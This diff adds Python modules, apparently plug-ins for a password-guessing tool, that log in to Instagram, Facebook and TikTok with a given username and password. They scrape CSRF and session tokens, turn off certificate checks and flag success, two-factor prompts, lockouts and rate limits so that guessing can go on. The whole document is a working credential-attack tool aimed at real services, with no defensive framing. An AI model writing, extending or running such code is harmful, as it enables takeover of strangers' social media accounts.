@@ -1,0 +1,67 @@
+```python
+import requests, time, urllib3
+urllib3.disable_warnings()
+class Platform:
+    name = "Instagram"; emoji = "📸"; color = "magenta"
+    def setup(self):
+        self.s = requests.Session()
+        self.s.headers.update({"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"})
+    def attempt(self, u, p):
+        try:
+            r = self.s.get("https://www.instagram.com/accounts/login/", verify=False, timeout=10)
+            csrf = self.s.cookies.get("csrftoken")
+            if not csrf: return {"success":False}
+            ts = str(int(time.time()))
+            enc = f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{p}"
+            self.s.headers.update({"X-CSRFToken":csrf,"X-Requested-With":"XMLHttpRequest","Referer":"https://www.instagram.com/accounts/login/"})
+            self.s.cookies.set("ig_cb","2")
+            r = self.s.post("https://www.instagram.com/accounts/login/ajax/", data={"username":u,"enc_password":enc,"queryParams":"{}","optIntoOneTap":"false"}, verify=False, timeout=10, allow_redirects=False)
+            j = r.json()
+            if j.get("authenticated"): return {"success":True,"password":p}
+            if j.get("two_factor_required"): return {"success":True,"password":p,"twofa":True}
+            if "checkpoint" in str(j).lower(): return {"success":False,"blocked":True}
+            if "wait" in str(j).lower(): return {"success":False,"rate_limit":True,"wait":30}
+            return {"success":False}
+        except: return {"success":False}
+modules/facebook.py
+
+python
+
+
+
+import requests, re, urllib3
+urllib3.disable_warnings()
+class Platform:
+    name = "Facebook"; emoji = "📘"; color = "blue"
+    def setup(self):
+        self.s = requests.Session()
+        self.s.headers.update({"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"})
+    def attempt(self, u, p):
+        try:
+            r = self.s.get("https://www.facebook.com/", verify=False, timeout=10)
+            lsd = re.search(r'name="lsd" value="([^"]+)"', r.text)
+            if not lsd: return {"success":False}
+            r = self.s.post("https://www.facebook.com/login.php?login_attempt=1", data={"lsd":lsd.group(1),"email":u,"pass":p,"default_persistent":"0","timezone":"-60","lgndim":"","lgnrnd":"","lgnjs":"n","locale":"en_US","qsstamp":""}, verify=False, timeout=10, allow_redirects=False)
+            if "c_user" in self.s.cookies: return {"success":True,"password":p}
+            return {"success":False}
+        except: return {"success":False}
+modules/tiktok.py
+
+python
+
+
+
+import requests, urllib3
+urllib3.disable_warnings()
+class Platform:
+    name = "TikTok"; emoji = "🎵"; color = "cyan"
+    def setup(self):
+        self.s = requests.Session()
+        self.s.headers.update({"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36","Referer":"https://www.tiktok.com/login"})
+    def attempt(self, u, p):
+        try:
+            r = self.s.post("https://www.tiktok.com/api/v1/auth/login/", data={"username":u,"password":p,"service":"https://www.tiktok.com/"}, verify=False, timeout=10)
+            j = r.json()
+            if j.get("data",{}).get("user_id"): return {"success":True,"password":p}
+            return {"success":False}
+        except: return {"success":False}
